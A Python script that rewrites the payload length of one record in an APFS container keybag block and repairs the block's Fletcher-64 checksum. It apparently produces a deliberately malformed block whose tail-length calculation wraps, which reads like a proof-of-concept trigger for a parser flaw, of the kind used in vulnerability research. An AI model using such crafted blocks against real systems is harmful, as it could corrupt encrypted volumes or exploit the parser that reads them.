#!/usr/bin/env python3
"""Patch one APFS container-keybag record length and repair o_cksum."""

from __future__ import annotations

import argparse
import pathlib
import struct


MODULUS = (1 << 32) - 1


def u16(data: bytes | bytearray, offset: int) -> int:
    return struct.unpack_from("<H", data, offset)[0]


def u32(data: bytes | bytearray, offset: int) -> int:
    return struct.unpack_from("<I", data, offset)[0]


def aligned_entry_span(payload_length: int) -> int:
    return (payload_length + 0x18 + 0xF) & ~0xF


def fletcher64(block: bytes | bytearray) -> int:
    lo = 0
    hi = 0
    body = memoryview(block)[8:]
    if len(body) % 4:
        raise ValueError("object size after o_cksum is not u32-aligned")
    for (word,) in struct.iter_unpack("<I", body):
        lo = (lo + word) % MODULUS
        hi = (hi + lo) % MODULUS
    check1 = MODULUS - ((lo + hi) % MODULUS)
    check2 = MODULUS - ((lo + check1) % MODULUS)
    return (check2 << 32) | check1


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("input", type=pathlib.Path)
    parser.add_argument("output", type=pathlib.Path)
    parser.add_argument("--type", type=lambda value: int(value, 0), required=True)
    parser.add_argument(
        "--payload-length", type=lambda value: int(value, 0), required=True
    )
    args = parser.parse_args()

    block = bytearray(args.input.read_bytes())
    if len(block) != 0x4000:
        raise SystemExit(f"expected one 0x4000-byte locker block, got {len(block):#x}")
    if block[0x18:0x1C] != b"syek":
        raise SystemExit(f"expected little-endian 'keys' magic, got {block[0x18:0x1c]!r}")
    if fletcher64(block) != struct.unpack_from("<Q", block, 0)[0]:
        raise SystemExit("input object checksum is invalid")

    bag = 0x20
    count = u16(block, bag + 2)
    total_length = u32(block, bag + 4)
    cursor = bag + 0x10
    bag_end = bag + total_length
    target = None
    for index in range(count):
        if cursor + 0x18 > bag_end:
            raise SystemExit(f"entry {index} header exceeds declared bag")
        record_type = u16(block, cursor + 0x10)
        payload_length = u16(block, cursor + 0x12)
        span = aligned_entry_span(payload_length)
        print(
            f"entry[{index}] offset={cursor - bag:#x} type={record_type} "
            f"payload={payload_length:#x} span={span:#x}"
        )
        if record_type == args.type:
            if target is not None:
                raise SystemExit(f"multiple records have type {args.type}")
            target = cursor
        cursor += span

    if target is None:
        raise SystemExit(f"record type {args.type} not found")
    if not 0 <= args.payload_length <= 0xFFFF:
        raise SystemExit("payload length must fit uint16_t")

    old_payload = u16(block, target + 0x12)
    old_span = aligned_entry_span(old_payload)
    malformed_span = aligned_entry_span(args.payload_length)
    entry_offset = target - bag
    remaining = total_length - entry_offset
    tail_length = (total_length - entry_offset - malformed_span) & ((1 << 64) - 1)
    struct.pack_into("<H", block, target + 0x12, args.payload_length)
    struct.pack_into("<Q", block, 0, fletcher64(block))

    print(
        f"patched type={args.type} payload {old_payload:#x}->{args.payload_length:#x}; "
        f"span {old_span:#x}->{malformed_span:#x}; remaining={remaining:#x}; "
        f"relocation_tail_u64={tail_length:#x}; checksum={struct.unpack_from('<Q', block, 0)[0]:#x}"
    )
    args.output.write_bytes(block)


if __name__ == "__main__":
    main()
